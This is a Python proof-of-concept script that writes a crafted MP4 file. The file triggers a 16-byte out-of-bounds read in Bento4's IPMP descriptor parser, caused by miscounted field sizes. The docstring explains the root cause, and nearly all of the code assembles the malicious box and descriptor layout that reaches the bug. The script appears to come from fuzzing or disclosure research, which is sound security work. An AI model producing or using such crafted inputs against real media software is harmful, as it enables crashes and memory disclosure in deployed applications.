#!/usr/bin/env python3
"""
PoC generator for VULN 003:
  Wrong fields_size Accounting in AP4_IpmpDescriptor Causes 16-Byte OOB Read
  CWE-125: Out-of-bounds Read
  Function: AP4_IpmpDescriptor::AP4_IpmpDescriptor()

Root cause (Ap4Ipmp.cpp):
  In the m_DescriptorId==0xFF && m_IpmpsType==0xFFFF branch:
    AP4_Size fields_size = 3+3;          // <-- intended: 3(initial)+2+1=6, but MISSES 16 for ToolId
    stream.ReadUI16(m_DescriptorIdEx);   // 2 bytes consumed
    stream.Read(m_ToolId, 16);           // 16 bytes consumed -- NOT counted in fields_size!
    stream.ReadUI08(m_ControlPointCode); // 1 byte consumed
    // total consumed from payload = 3+2+16+1 = 22 bytes
    // but fields_size = 6
    m_Data.SetDataSize(payload_size - fields_size);  // = 30 - 6 = 24 bytes allocated
    stream.Read(m_Data.UseData(), payload_size - fields_size);
    // tries to read 24 bytes; only 30-22=8 bytes remain in IPMP payload
    // -> reads 16 bytes BEYOND the IPMP descriptor's declared payload boundary

OOB trigger layout:
  ES_Descriptor payload (51 bytes):
    ES_ID (2B) + flags (1B)                          -> 3 bytes header
    IPMP tag (1B) + IPMP size=30 (1B) + payload (30B) -> 32 bytes descriptor
    padding (16B of 0xBB)                             -> 16 bytes AFTER the IPMP descriptor

  SubStream created by ES_Descriptor has size = 51-3 = 48 bytes.
  IPMP constructor reads:
    - tag(1) + size(1) consumed by factory            -> SubStream pos 2
    - DescriptorId(1) + IpmpsType(2) = 3B             -> SubStream pos 5
    - DescriptorIdEx(2) + ToolId(16) + CPC(1) = 19B   -> SubStream pos 24
    - tries to read 24B: 48-24 = 24B available
      -> reads bytes [24..47] of SubStream
      -> bytes [32..47] are 16 bytes of PADDING outside the IPMP descriptor!
  This is the 16-byte OOB read across the IPMP descriptor's declared boundary.
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4DescriptorFactory_h/vuln_003.mp4"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def box(fourcc, data=b''):
    """Standard MP4 box: 4-byte big-endian length + 4-byte fourcc + data."""
    return struct.pack('>I', 8 + len(data)) + fourcc.encode('ascii') + data


def fullbox(fourcc, version, flags, data=b''):
    """FullBox: box with 4-byte version+flags prepended."""
    return box(fourcc, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)


def descriptor(tag, payload):
    """ISO 14496-1 expandable class-size descriptor encoding."""
    n = len(payload)
    if n < 0x80:
        size_bytes = bytes([n])
    else:
        parts = []
        while n >= 0x80:
            parts.insert(0, (n & 0x7F) | 0x80)
            n >>= 7
        parts.append(n)
        size_bytes = bytes(parts)
    return bytes([tag]) + size_bytes + payload


# ---------------------------------------------------------------------------
# IPMP Descriptor (tag=0x0B) -- the vulnerable descriptor
# ---------------------------------------------------------------------------
# payload_size = 30 bytes
#   1B  m_DescriptorId  = 0xFF      triggers the special branch
#   2B  m_IpmpsType     = 0xFFFF    confirms the branch
#   2B  m_DescriptorIdEx = 0x0001
#  16B  m_ToolId         = 0xAA*16
#   1B  m_ControlPointCode = 0x00   keeps fields_size at 6 (no ++fields_size)
#   8B  remaining data   = 0x00*8   last 8 bytes of the declared payload
#
# Code: fields_size=6, consumes 22 bytes, then tries read(24) -> 16B OOB
ipmp_payload = (
    bytes([0xFF]) +              # m_DescriptorId = 0xFF
    struct.pack('>H', 0xFFFF) +  # m_IpmpsType = 0xFFFF
    struct.pack('>H', 0x0001) +  # m_DescriptorIdEx = 1
    bytes([0xAA] * 16) +         # m_ToolId (16 bytes)
    bytes([0x00]) +              # m_ControlPointCode = 0
    bytes([0x00] * 8)            # remaining tail data (8 bytes)
)
assert len(ipmp_payload) == 30, f"Expected 30 bytes, got {len(ipmp_payload)}"

ipmp_desc = descriptor(0x0B, ipmp_payload)   # 1B tag + 1B size + 30B = 32 bytes
assert len(ipmp_desc) == 32

# ---------------------------------------------------------------------------
# Extra padding placed AFTER the IPMP descriptor inside ES_Descriptor payload
# ---------------------------------------------------------------------------
# This gives the SubStream 16 extra bytes beyond the IPMP boundary.
# The IPMP constructor will read these 16 bytes as part of its bogus 24-byte read,
# constituting the 16-byte OOB read past the IPMP descriptor's declared payload.
oob_padding = bytes([0xBB] * 16)   # 16 sentinel bytes to be read out-of-bound

# ---------------------------------------------------------------------------
# ES_Descriptor (tag=0x03)
# ---------------------------------------------------------------------------
# Payload: ES_ID(2) + flags(1) + IPMP_desc(32) + oob_padding(16) = 51 bytes
# SubStream created by ES_Descriptor constructor:
#   size = payload_size - 3 = 51 - 3 = 48 bytes
#   content = IPMP_desc(32) + oob_padding(16)
es_payload = (
    struct.pack('>H', 0x0001) +  # ES_ID = 1
    bytes([0x00]) +              # flags = 0x00 (no streamDependence, no URL, no OCR)
    ipmp_desc +                  # IPMP descriptor (32 bytes)
    oob_padding                  # 16 extra bytes the IPMP code will OOB-read
)
assert len(es_payload) == 51

es_desc = descriptor(0x03, es_payload)   # 1B + 1B + 51B = 53 bytes

# ---------------------------------------------------------------------------
# esds box (version=0, flags=0, then ES_Descriptor)
# ---------------------------------------------------------------------------
esds = box('esds', b'\x00\x00\x00\x00' + es_desc)

# ---------------------------------------------------------------------------
# mp4a sample entry
# ---------------------------------------------------------------------------
mp4a_header = (
    b'\x00' * 6 +                    # reserved (6 bytes)
    struct.pack('>H', 1) +           # data_reference_index = 1
    b'\x00' * 8 +                    # reserved (8 bytes)
    struct.pack('>H', 2) +           # channelcount = 2
    struct.pack('>H', 16) +          # samplesize = 16 bits
    struct.pack('>H', 0) +           # pre_defined = 0
    struct.pack('>H', 0) +           # reserved = 0
    struct.pack('>HH', 44100, 0)     # samplerate = 44100.0 as 16.16 fixed-point
)
mp4a = box('mp4a', mp4a_header + esds)

# ---------------------------------------------------------------------------
# stsd, stts, stsc, stsz, stco
# ---------------------------------------------------------------------------
stsd = fullbox('stsd', 0, 0, struct.pack('>I', 1) + mp4a)   # 1 sample entry
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))           # 0 time-to-sample entries
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))           # 0 sample-to-chunk entries
stsz = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))       # sample_size=0, count=0
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))           # 0 chunk offsets

stbl = box('stbl', stsd + stts + stsc + stsz + stco)

# ---------------------------------------------------------------------------
# smhd (sound media header)
# ---------------------------------------------------------------------------
smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))   # balance=0, reserved=0

# ---------------------------------------------------------------------------
# dinf / dref (data reference: self-contained)
# ---------------------------------------------------------------------------
url_entry = fullbox('url ', 0, 1, b'')                     # flags=1 = self-contained
dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box('dinf', dref)

# ---------------------------------------------------------------------------
# minf
# ---------------------------------------------------------------------------
minf = box('minf', smhd + dinf + stbl)

# ---------------------------------------------------------------------------
# mdhd (media header)
# ---------------------------------------------------------------------------
mdhd = fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 44100, 0) +   # c_time, m_time, timescale, duration
    struct.pack('>HH', 0x55C4, 0)             # language='und', pre_defined=0
)

# ---------------------------------------------------------------------------
# hdlr (handler: sound)
# ---------------------------------------------------------------------------
hdlr = fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) +   # pre_defined = 0
    b'soun' +                 # handler_type = 'soun'
    b'\x00' * 12 +            # reserved (3 × 4 bytes)
    b'\x00'                   # name = empty string (null-terminated)
)

# ---------------------------------------------------------------------------
# mdia
# ---------------------------------------------------------------------------
mdia = box('mdia', mdhd + hdlr + minf)

# ---------------------------------------------------------------------------
# tkhd (track header): flags=3 (track_enabled | track_in_movie)
# ---------------------------------------------------------------------------
identity_matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
tkhd = fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +   # c_time, m_time, track_id, reserved, duration
    struct.pack('>II', 0, 0) +                # reserved[2]
    struct.pack('>HHHH', 0, 0, 0x0100, 0) +  # layer, alt_group, volume=1.0 (8.8), reserved
    identity_matrix +                          # 36-byte identity matrix
    struct.pack('>II', 0, 0)                  # width=0, height=0 (audio track)
)

# ---------------------------------------------------------------------------
# trak
# ---------------------------------------------------------------------------
trak = box('trak', tkhd + mdia)

# ---------------------------------------------------------------------------
# mvhd (movie header)
# ---------------------------------------------------------------------------
mvhd = fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 44100, 0, 0x00010000) +  # c_time, m_time, timescale, duration, rate=1.0
    struct.pack('>H', 0x0100) +                           # volume = 1.0 (8.8 fixed)
    b'\x00' * 10 +                                        # reserved (10 bytes)
    identity_matrix +                                     # 36-byte identity matrix
    b'\x00' * 24 +                                        # pre_defined (6 × 4 bytes)
    struct.pack('>I', 2)                                  # next_track_ID = 2
)

# ---------------------------------------------------------------------------
# moov
# ---------------------------------------------------------------------------
moov = box('moov', mvhd + trak)

# ---------------------------------------------------------------------------
# ftyp (file type compatibility)
# ---------------------------------------------------------------------------
ftyp = box('ftyp',
    b'mp42' +                        # major_brand
    struct.pack('>I', 0) +           # minor_version
    b'mp42' + b'isom' + b'M4A '      # compatible_brands
)

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4_data = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, 'wb') as f:
    f.write(mp4_data)

file_size = os.path.getsize(OUTPUT)
print(f"[+] Written {file_size} bytes to {OUTPUT}")
print(f"[+] IPMP descriptor payload: {len(ipmp_payload)} bytes (declared)")
print(f"[+] fields_size in code: 6 (wrong; should be 22)")
print(f"[+] Code tries to read: {30 - 6} bytes after consuming 22")
print(f"[+] OOB: 24 - 8 = 16 bytes read beyond IPMP payload boundary")
print(f"[+] OOB bytes: 16 × 0xBB sentinel padding in ES_Descriptor")
